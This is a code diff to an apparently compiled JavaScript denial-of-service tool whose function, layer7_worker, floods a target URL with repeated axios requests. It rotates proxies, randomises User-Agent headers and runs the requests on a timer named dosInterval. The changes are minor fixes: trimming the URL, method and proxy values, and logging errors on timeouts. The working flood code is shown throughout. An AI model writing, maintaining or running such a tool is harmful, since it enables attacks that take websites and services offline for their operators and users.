@@ -31,14 +31,14 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                 const [host, port] = proxy.split(":");
                 try {
                     yield (0, axios_1.default)({
-                        url: targetUrl,
-                        method: requestType,
+                        url: targetUrl.trim(),
+                        method: requestType.trim(),
                         headers: {
                             "User-Agent": (0, ua_gen_1.UAGen)().trim(),
                         },
                         proxy: {
-                            host: host,
-                            port: parseInt(port)
+                            host: host.trim(),
+                            port: parseInt(port.trim()),
                         },
                         timeout: 3000,
                     }).then((response) => {
@@ -54,7 +54,7 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                     if (error.code === "ECONNABORTED") {
                         console.error(`${yellow}△${white} Connection time out.`);
                     }
-                    console.log(`${yellow}△${white}${proxy.trim()} is timed out.`);
+                    console.log(`${yellow}△${white}${proxy.trim()} is timed out. ${error}`);
                 }
             }), interval);
             setTimeout(() => __awaiter(this, void 0, void 0, function* () {
@@ -69,8 +69,8 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
             dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                 try {
                     yield (0, axios_1.default)({
-                        url: targetUrl,
-                        method: requestType,
+                        url: targetUrl.trim(),
+                        method: requestType.trim(),
                         headers: {
                             "User-Agent": (0, ua_gen_1.UAGen)().trim(),
                         },
